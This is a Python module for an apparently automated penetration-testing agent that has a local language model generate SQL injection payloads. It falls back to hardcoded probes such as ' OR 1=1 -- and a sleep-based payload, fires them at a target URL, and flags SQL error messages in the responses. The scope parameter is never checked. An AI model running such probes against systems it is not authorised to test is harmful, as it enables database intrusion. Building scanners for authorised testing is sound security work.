# agents/specialists/sqli_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class SQLiSpecialist(ISpecialist):
    """SQL Injection specialist agent.

    Uses local qwen2.5-coder:7b to generate context-specific SQL payloads,
    sends requests through the proxy, and checks for SQL error signatures or time delays.
    """

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.SQLI

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        # 1. Ask ModelRouter for payload ideas
        prompt = (
            f"Generate 3 SQL injection test payloads for endpoint: {target}. "
            f"Format as raw payloads only, one per line. Keep them simple."
        )

        payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL, NULL --",
            "1' AND sleep(5) --",
        ]

        if self.model_router:
            try:
                resp = await self.model_router.route(
                    task_type="payload_craft",
                    prompt=prompt,
                    agent_id="sqli_specialist",
                    task_id=correlation_id,
                )
                generated = [line.strip() for line in resp.text.split("\n") if line.strip()]
                if generated:
                    payloads = generated[:5]
            except Exception as e:
                logger.warning(f"Failed to use ModelRouter for SQLi payloads: {e}")

        # 2. Execute payloads against the target
        async with aiohttp.ClientSession() as session:
            for p in payloads:
                test_url = f"{target}?q={p}"
                try:
                    async with session.get(test_url, timeout=10) as response:
                        body = await response.text()
                        # Detect standard SQL errors
                        errors = ["SQL syntax", "mysql_fetch", "PostgreSQL query", "driver exception"]
                        if any(err in body for err in errors):
                            finding = Finding(
                                finding_id=f"sqli_{uuid.uuid4().hex[:8]}",
                                title="SQL Injection Detected via Error Signature",
                                description=f"SQL error signature leaked in response to payload: {p}",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "url": test_url,
                                    "status": response.status,
                                    "match": [err for err in errors if err in body][0],
                                },
                                confidence=0.85,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error requesting {test_url}: {e}")

        return findings
